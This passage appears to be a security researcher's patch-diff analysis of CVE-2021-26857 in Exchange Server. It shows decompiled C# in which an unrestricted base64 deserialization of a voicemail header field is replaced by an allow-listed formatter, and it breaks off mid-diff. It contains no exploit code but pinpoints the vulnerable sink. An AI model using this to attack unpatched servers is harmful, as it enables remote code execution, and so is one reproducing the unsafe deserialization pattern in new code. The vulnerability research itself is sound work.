      "document": "As per [Microsoft's blog post](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) on Exchange Server 0day use by the HAFNIUM actors, [CVE-2021-26857](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857) is a deserialization vulnerability in Exchange Server's Unified Messaging (voicemail) service. Exploiting the vulnerability reportedly requires admin access or chaining with another vuln (likely [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855)), but successful exploitation results in RCE as the `SYSTEM` account. This vulnerability would ideally be combined with an [auth bypass](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/), which CVE-2021-26855 may very well provide.\r\n\r\nI took a look at CVE-2021-26857 last night and came up with the following patch diff:\r\n\r\n```diff\r\n--- exchange.unpatched/Microsoft.Exchange.UM.UMCore/UMCore/PipelineContext.cs\t2021-03-02 19:54:18.000000000 -0600\r\n+++ exchange.patched/Microsoft.Exchange.UM.UMCore/UMCore/PipelineContext.cs\t2021-03-02 19:55:19.000000000 -0600\r\n@@ -1,742 +1,886 @@\r\n \ufeffusing System;\r\n+using System.Collections.Generic;\r\n using System.Globalization;\r\n using System.IO;\r\n+using System.Runtime.Serialization;\r\n+using Microsoft.Exchange.Compliance.Serialization.Formatters;\r\n+using Microsoft.Exchange.Data;\r\n+using Microsoft.Exchange.Data.Common;\r\n using Microsoft.Exchange.Data.Directory;\r\n using Microsoft.Exchange.Data.Directory.Recipient;\r\n using Microsoft.Exchange.Data.Directory.SystemConfiguration;\r\n using Microsoft.Exchange.Data.Storage;\r\n using Microsoft.Exchange.Diagnostics;\r\n using Microsoft.Exchange.Diagnostics.Components.UnifiedMessaging;\r\n using Microsoft.Exchange.ExchangeSystem;\r\n using Microsoft.Exchange.TextProcessing.Boomerang;\r\n using Microsoft.Exchange.UM.UMCommon;\r\n+using Microsoft.Mapi;\r\n\r\n namespace Microsoft.Exchange.UM.UMCore\r\n {\r\n \tinternal abstract class PipelineContext : DisposableBase, IUMCreateMessage\r\n \t{\r\n \t\tinternal PipelineContext()\r\n \t\t{\r\n \t\t}\r\n\r\n \t\tinternal PipelineContext(SubmissionHelper helper)\r\n \t\t{\r\n \t\t\tbool flag = false;\r\n \t\t\ttry\r\n \t\t\t{\r\n \t\t\t\tthis.helper = helper;\r\n \t\t\t\tthis.cultureInfo = new CultureInfo(helper.CultureInfo);\r\n \t\t\t\tflag = true;\r\n \t\t\t}\r\n \t\t\tfinally\r\n \t\t\t{\r\n \t\t\t\tif (!flag)\r\n \t\t\t\t{\r\n \t\t\t\t\tthis.Dispose();\r\n \t\t\t\t}\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tpublic MessageItem MessageToSubmit\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.messageToSubmit;\r\n \t\t\t}\r\n \t\t\tprotected set\r\n \t\t\t{\r\n \t\t\t\tthis.messageToSubmit = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tpublic string MessageID\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.messageID;\r\n \t\t\t}\r\n \t\t\tprotected set\r\n \t\t\t{\r\n \t\t\t\tthis.messageID = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tinternal abstract Pipeline Pipeline { get; }\r\n\r\n \t\tinternal Microsoft.Exchange.UM.UMCommon.PhoneNumber CallerId\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.helper.CallerId;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tinternal Guid TenantGuid\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.helper.TenantGuid;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tinternal int ProcessedCount\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.processedCount;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tinternal ExDateTime SentTime\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.sentTime;\r\n \t\t\t}\r\n \t\t\tset\r\n \t\t\t{\r\n \t\t\t\tthis.sentTime = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tinternal CultureInfo CultureInfo\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.cultureInfo;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected internal string HeaderFileName\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\tif (string.IsNullOrEmpty(this.headerFileName))\r\n \t\t\t\t{\r\n \t\t\t\t\tGuid guid = Guid.NewGuid();\r\n \t\t\t\t\tthis.headerFileName = Path.Combine(Utils.VoiceMailFilePath, guid.ToString() + \".txt\");\r\n \t\t\t\t}\r\n \t\t\t\treturn this.headerFileName;\r\n \t\t\t}\r\n \t\t\tprotected set\r\n \t\t\t{\r\n \t\t\t\tthis.headerFileName = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected internal string CallerAddress\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.helper.CallerAddress;\r\n \t\t\t}\r\n \t\t\tprotected set\r\n \t\t\t{\r\n \t\t\t\tthis.helper.CallerAddress = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected internal string CallerIdDisplayName\r\n \t\t{\r\n \t\t\tget\r\n \t\t\t{\r\n \t\t\t\treturn this.helper.CallerIdDisplayName;\r\n \t\t\t}\r\n \t\t\tprotected set\r\n \t\t\t{\r\n \t\t\t\tthis.helper.CallerIdDisplayName = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tprotected internal string MessageType\r\n \t\t{\r\n \t\t\tinternal get\r\n \t\t\t{\r\n \t\t\t\treturn this.messageType;\r\n \t\t\t}\r\n \t\t\tset\r\n \t\t\t{\r\n \t\t\t\tthis.messageType = value;\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tpublic virtual void PrepareUnProtectedMessage()\r\n \t\t{\r\n \t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, this.GetHashCode(), \"PipelineContext:PrepareUnProtectedMessage.\", Array.Empty<object>());\r\n \t\t\tusing (DisposeGuard disposeGuard = default(DisposeGuard))\r\n \t\t\t{\r\n \t\t\t\tthis.messageToSubmit = MessageItem.CreateInMemory(StoreObjectSchema.ContentConversionProperties);\r\n \t\t\t\tdisposeGuard.Add<MessageItem>(this.messageToSubmit);\r\n \t\t\t\tthis.SetMessageProperties();\r\n \t\t\t\tdisposeGuard.Success();\r\n \t\t\t}\r\n \t\t}\r\n\r\n \t\tpublic virtual void PrepareProtectedMessage()\r\n \t\t{\r\n \t\t\tthrow new InvalidOperationException();\r\n \t\t}\r\n\r\n \t\tpublic virtual void PrepareNDRForFailureToGenerateProtectedMessage()\r\n \t\t{\r\n \t\t\tthrow new InvalidOperationException();\r\n \t\t}\r\n\r\n \t\tpublic virtual PipelineDispatcher.WIThrottleData GetThrottlingData()\r\n \t\t{\r\n \t\t\treturn new PipelineDispatcher.WIThrottleData\r\n \t\t\t{\r\n \t\t\t\tKey = this.GetMailboxServerId(),\r\n \t\t\t\tRecipientId = this.GetRecipientIdForThrottling(),\r\n \t\t\t\tWorkItemType = PipelineDispatcher.ThrottledWorkItemType.NonCDRWorkItem\r\n \t\t\t};\r\n \t\t}\r\n\r\n \t\tpublic virtual void PostCompletion()\r\n \t\t{\r\n \t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, 0, \"PipelineContext - Deleting header file '{0}'\", new object[]\r\n \t\t\t{\r\n \t\t\t\tthis.headerFileName\r\n \t\t\t});\r\n \t\t\tUtil.TryDeleteFile(this.headerFileName);\r\n \t\t}\r\n\r\n \t\tinternal static PipelineContext FromHeaderFile(string headerFile)\r\n \t\t{\r\n \t\t\tPipelineContext pipelineContext = null;\r\n \t\t\tPipelineContext result;\r\n \t\t\ttry\r\n \t\t\t{\r\n \t\t\t\tContactInfo contactInfo = null;\r\n \t\t\t\tstring text = null;\r\n \t\t\t\tint num = 0;\r\n \t\t\t\tExDateTime exDateTime = default(ExDateTime);\r\n \t\t\t\tstring text2 = null;\r\n \t\t\t\tSubmissionHelper submissionHelper = new SubmissionHelper();\r\n \t\t\t\tuint num2;\r\n \t\t\t\tusing (StreamReader streamReader = File.OpenText(headerFile))\r\n \t\t\t\t{\r\n \t\t\t\t\tstring text3;\r\n \t\t\t\t\twhile ((text3 = streamReader.ReadLine()) != null)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tstring[] array = text3.Split(\" : \".ToCharArray(), 2, StringSplitOptions.RemoveEmptyEntries);\r\n \t\t\t\t\t\tif (array != null && array.Length == 2)\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tstring text4 = array[0];\r\n \t\t\t\t\t\t\tnum2 = <PrivateImplementationDetails>.ComputeStringHash(text4);\r\n \t\t\t\t\t\t\tif (num2 <= 872212143U)\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tif (num2 <= 134404218U)\r\n \t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\tif (num2 != 77294025U)\r\n \t\t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\t\tif (num2 != 111122938U)\r\n \t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\tif (num2 == 134404218U)\r\n+\t\t\t\t\t\t\t\t\t\t\tif (num2 != 134404218U)\r\n \t\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\t\tif (text4 == \"ProcessedCount\")\r\n-\t\t\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\t\t\tnum = Convert.ToInt32(array[1], CultureInfo.InvariantCulture) + 1;\r\n-\t\t\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"ProcessedCount\"))\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tnum = Convert.ToInt32(array[1], CultureInfo.InvariantCulture) + 1;\r\n+\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\t\t\telse if (text4 == \"RecipientObjectGuid\")\r\n+\t\t\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"RecipientObjectGuid\"))\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\t\t\tsubmissionHelper.RecipientObjectGuid = new Guid(array[1]);\r\n \t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\t\telse if (text4 == \"CallerNAme\")\r\n+\t\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"CallerNAme\"))\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\t\tsubmissionHelper.CallerName = array[1];\r\n \t\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\telse if (num2 <= 507978139U)\r\n \t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\tif (num2 != 152414519U)\r\n \t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tif (num2 == 507978139U)\r\n+\t\t\t\t\t\t\t\t\t\tif (num2 != 507978139U)\r\n \t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\tif (text4 == \"RecipientName\")\r\n-\t\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\t\tsubmissionHelper.RecipientName = array[1];\r\n-\t\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"RecipientName\"))\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tsubmissionHelper.RecipientName = array[1];\r\n+\t\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\t\telse if (text4 == \"ContactInfo\")\r\n+\t\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tcontactInfo = (CommonUtil.Base64Deserialize(array[1]) as ContactInfo);\r\n-\t\t\t\t\t\t\t\t\t\tcontinue;\r\n+\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"ContactInfo\"))\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tException ex = null;\r\n+\t\t\t\t\t\t\t\t\t\ttry\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\ttry\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t\tusing (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(array[1])))\r\n+\t\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t\t\tcontactInfo = (ContactInfo)TypedBinaryFormatter.DeserializeObject(memoryStream, PipelineContext.contactInfoDeserializationAllowList, null, true);\r\n+\t\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tcatch (ArgumentNullException ex)\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tcatch (SerializationException ex)\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tcatch (Exception ex)\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tfinally\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tif (ex != null)\r\n+\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t\tCallIdTracer.TraceDebug(ExTraceGlobals.VoiceMailTracer, 0, \"Failed to get contactInfo from header file {0} with Error={1}\", new object[]\r\n+\t\t\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\t\t\theaderFile,\r\n+\t\t\t\t\t\t\t\t\t\t\t\t\tex\r\n+\t\t\t\t\t\t\t\t\t\t\t\t});\r\n+\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\telse if (num2 != 707084238U)\r\n \t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\tif (num2 == 872212143U)\r\n+\t\t\t\t\t\t\t\t\tif (num2 != 872212143U)\r\n \t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tif (text4 == \"CallerId\")\r\n-\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\tsubmissionHelper.CallerId = Microsoft.Exchange.UM.UMCommon.PhoneNumber.Parse(array[1]);\r\n-\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tif (!(text4 == \"CallerId\"))\r\n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tsubmissionHelper.CallerId = Microsoft.Exchange.UM.UMCommon.PhoneNumber.Parse(array[1]);\r\n+\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\telse if (text4 == \"SentTime\")\r\n+\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\tif (!(text4 == \"SentTime\"))\r\n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\tDateTime dateTime = Convert.ToDateTime(array[1], CultureInfo.InvariantCulture);\r\n \t\t\t\t\t\t\t\t\texDateTime = new ExDateTime(ExTimeZone.CurrentTimeZone, dateTime);\r\n \t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\telse if (num2 <= 2593661420U)\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tif (num2 <= 1526417836U)\r\n \t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\tif (num2 != 978885386U)\r\n \t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tif (num2 == 1526417836U)\r\n+\t\t\t\t\t\t\t\t\t\tif (num2 != 1526417836U)\r\n \t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\tif (text4 == \"MessageType\")\r\n-\t\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\t\ttext = array[1];\r\n-\t\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"MessageType\"))\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\ttext = array[1];\r\n+\t\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\t\telse if (text4 == \"CallerAddress\")\r\n+\t\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tif (!(text4 == \"CallerAddress\"))\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\t\tsubmissionHelper.CallerAddress = array[1];\r\n \t\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\telse if (num2 != 1850847732U)\r\n \t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\tif (num2 == 2593661420U)\r\n+\t\t\t\t\t\t\t\t\tif (num2 != 2593661420U)\r\n \t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tif (text4 == \"CallId\")\r\n-\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\tsubmissionHelper.CallId = array[1];\r\n-\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tif (!(text4 == \"CallId\"))\r\n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tsubmissionHelper.CallId = array[1];\r\n+\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\telse if (text4 == \"CallerIdDisplayName\")\r\n+\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\tif (!(text4 == \"CallerIdDisplayName\"))\r\n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\tsubmissionHelper.CallerIdDisplayName = array[1];\r\n \t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\telse if (num2 <= 3342616108U)\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tif (num2 != 2975106116U)\r\n \t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\tif (num2 == 3342616108U)\r\n+\t\t\t\t\t\t\t\t\tif (num2 != 3342616108U)\r\n \t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tif (text4 == \"TenantGuid\")\r\n-\t\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\t\tsubmissionHelper.TenantGuid = new Guid(array[1]);\r\n-\t\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tif (!(text4 == \"TenantGuid\"))\r\n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tsubmissionHelper.TenantGuid = new Guid(array[1]);\r\n+\t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\t\telse if (text4 == \"SenderAddress\")\r\n+\t\t\t\t\t\t\t\telse\r\n \t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\tif (!(text4 == \"SenderAddress\"))\r\n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t\t\tstring text5 = array[1];\r\n \t\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\telse if (num2 != 3581765001U)\r\n \t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\tif (num2 == 4186841001U)\r\n+\t\t\t\t\t\t\t\tif (num2 != 4186841001U)\r\n \t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\tif (text4 == \"CultureInfo\")\r\n-\t\t\t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\t\t\tsubmissionHelper.CultureInfo = array[1];\r\n-\t\t\t\t\t\t\t\t\t\tcontinue;\r\n-\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n+\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\tif (!(text4 == \"CultureInfo\"))\r\n+\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\tsubmissionHelper.CultureInfo = array[1];\r\n+\t\t\t\t\t\t\t\tcontinue;\r\n \t\t\t\t\t\t\t}\r\n-\t\t\t\t\t\t\telse if (text4 == \"MessageID\")\r\n+\t\t\t\t\t\t\telse if (!(text4 == \"MessageID\"))\r\n \t\t\t\t\t\t\t{\r\n-\t\t\t\t\t\t\t\ttext2 = array[1];\r\n-\t\t\t\t\t\t\t\tcontinue;\r\n+\t\t\t\t\t\t\t\tgoto IL_409;\r\n \t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\ttext2 = array[1];\r\n+\t\t\t\t\t\t\tcontinue;\r\n+\t\t\t\t\t\t\tIL_409:\r\n \t\t\t\t\t\t\tsubmissionHelper.CustomHeaders[array[0]] = array[1];\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t}\r\n \t\t\t\t}\r\n \t\t\t\tnum2 = <PrivateImplementationDetails>.ComputeStringHash(text);\r\n \t\t\t\tif (num2 <= 894870128U)\r\n \t\t\t\t{\r\n \t\t\t\t\tif (num2 <= 360985808U)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tif (num2 != 356120169U)\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tif (num2 == 360985808U)\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tif (text == \"Fax\")\r\n \t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\tpipelineContext = new FaxPipelineContext(submissionHelper);\r\n-\t\t\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t\telse if (text == \"IncomingCallLog\")\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tpipelineContext = new IncomingCallLogPipelineContext(submissionHelper);\r\n-\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t}\r\n \t\t\t\t\telse if (num2 != 438908515U)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tif (num2 != 466919760U)\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tif (num2 == 894870128U)\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tif (text == \"CDR\")\r\n \t\t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\t\tpipelineContext = CDRPipelineContext.Deserialize((string)submissionHelper.CustomHeaders[\"CDRData\"]);\r\n-\t\t\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t\telse if (text == \"MissedCall\")\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tpipelineContext = new MissedCallPipelineContext(submissionHelper);\r\n-\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t}\r\n \t\t\t\t\telse if (text == \"OCSNotification\")\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tpipelineContext = OCSPipelineContext.Deserialize((string)submissionHelper.CustomHeaders[\"OCSNotificationData\"]);\r\n \t\t\t\t\t\ttext2 = pipelineContext.messageID;\r\n \t\t\t\t\t\texDateTime = pipelineContext.sentTime;\r\n-\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t}\r\n \t\t\t\t}\r\n \t\t\t\telse if (num2 <= 1086454342U)\r\n \t\t\t\t{\r\n \t\t\t\t\tif (num2 != 995233564U)\r\n \t\t\t\t\t{\r\n \t\t\t\t\t\tif (num2 == 1086454342U)\r\n \t\t\t\t\t\t{\r\n \t\t\t\t\t\t\tif (text == \"XSOVoiceMail\")\r\n \t\t\t\t\t\t\t{\r\n \t\t\t\t\t\t\t\tpipelineContext = new XSOVoiceMessagePipelineContext(submissionHelper);\r\n-\t\t\t\t\t\t\t\tgoto IL_62E;\r\n+\t\t\t\t\t\t\t\tgoto IL_694;\r\n \t\t\t\t\t\t\t}\r\n \t\t\t\t\t\t}\r\n \t\t\t\t\t}\r\n \t\t\t\t\telse if (text == \"PartnerTranscriptionRequest\")\r\n 